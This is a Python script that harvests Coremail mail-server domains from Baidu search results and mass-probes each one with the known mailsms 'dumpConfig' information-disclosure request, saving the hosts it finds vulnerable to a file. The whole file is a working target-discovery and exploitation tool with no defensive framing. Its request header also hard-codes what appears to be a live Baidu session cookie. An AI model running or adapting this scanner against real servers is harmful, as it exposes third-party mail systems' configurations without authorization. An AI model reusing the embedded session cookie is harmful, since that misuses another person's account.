#coding=utf-8
import sys
import requests
from lxml import etree
import re
import time

result = []
header = {
    'Host': 'www.baidu.com',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0',
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&tn=monline_3_dg&wd=inurl%3Acoremail&oq=inurl%253Acoremail&rsv_pq=8c14e3b400002f27&rsv_t=513dF3go7PBeOnqviE3gQjidf1qVX8D9D9v2PHk10%2FAxF%2F2bFkaFRn3I5Sp0B5SASsxs&rqlang=cn&rsv_enter=0&rsv_dl=tb&rsv_btype=t',
    'is_referer': 'https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&tn=monline_3_dg&wd=inurl%3Acoremail&oq=inurl%3Acoremail&rsv_pq=8c14e3b400002f27&rsv_t=226bGmrdihOp%2B%2BykI3PrxGyL%2Fv0UPCu41IKssQ3doOHQGxGS5ZHNWPXDsOzm6cksqg0Q&rqlang=cn',
    'is_xhr': '1',
    'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'close',
    'Cookie': 'BAIDUID=B294B004093AE4FED6E24619C90E447F:FG=1; BIDUPSID=B294B004093AE4FE5B7EA9CCFEAF3A82; PSTM=1590117175; BDUSS=h-VDZQblcxYlZTcEkzcmRmV3dWb0dHbEFQd2lUMEl2VGdBdmhyLWFvSEFVdk5lSVFBQUFBJCQAAAAAAAAAAAEAAAALUXn2aGFja2h1YW5namlhAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDFy17AxcteWj; BD_UPN=133352; BDRCVFR[Fc9oatPmwxn]=mk3SLVN4HKm; delPer=0; BD_CK_SAM=1; PSINO=6; H_PS_PSSID=1429_32568_32503_32482; sug=3; sugstore=0; ORIGIN=0; bdime=0; H_PS_645EC=513dF3go7PBeOnqviE3gQjidf1qVX8D9D9v2PHk10%2FAxF%2F2bFkaFRn3I5Sp0B5SASsxs; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; WWW_ST=1597824372882'
          }

def askHtml(url):
    #访问请求
    try:
        r = requests.get(url,headers = header)
        r.encoding = r.apparent_encoding
        html = r.text
        return html
    except Exception as e:
        print(e)

def spiderUrl():
    #爬取跳转链接
    with open('1.html','r') as f:
        text=f.read()
        html = etree.HTML(text)
        results = html.xpath('//*[@id="content_left"]/div/div/a')
        with open('ip.txt','a') as s:
            for i in results:
                url = i.get('href').split('\r\n')
                if "cache" in url[0]:
                    continue
                result.append(url[0])
                s.write(url[0])
                s.write('\n')
        for i in result:
            print(i)

def getRealUrl():
    #爬取域名
    for p in range(7,15):
        URL = 'http://www.baidu.com/s?wd=inurl%3Acoremail&pn='+str((p-1)*10)
        print(URL)
        html = askHtml(URL)
        group = re.findall('[a-zA-Z"]*</b>+\.[a-zA-Z0-9]+\.[a-zA-Z0-9]+\.[comn]{1,3}',html)
        with open('ip.txt','a') as f:
            for i in group:
                f.write(str(i).replace('</b>',''))
                f.write('\n')

def checkUrlExist():
    with open('ip.txt','r') as f:
        for i in f.readlines():
            url = 'http://'+ i.strip('\n')
            # print(url)
            try:
                r = requests.get(url,timeout=10)
                if r.status_code == 200:
                    print(url + ' ' + 'the url is exisit')
            except Exception as e:
                print(e)


def mailsmsPoC(url):
    url = 'http://'+ url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    print(url)
    try:
        r = requests.get(url,timeout=10)
        if (r.status_code != '404') and ("/home/coremail" in r.text):
            print("mailsms is vulnerable: {0}".format(url))
            with open('vul.txt', 'a') as f:
                    f.write(url + '\n')
        else:
            print("mailsms is safe!")
    except Exception as e:
        print("######time out######")

if __name__ == '__main__':
    # getRealUrl()
    # checkUrlExist()
    with open('ip.txt','r') as f:
        for i in f.readlines():
            url = i.strip('\r\n')
            mailsmsPoC(url)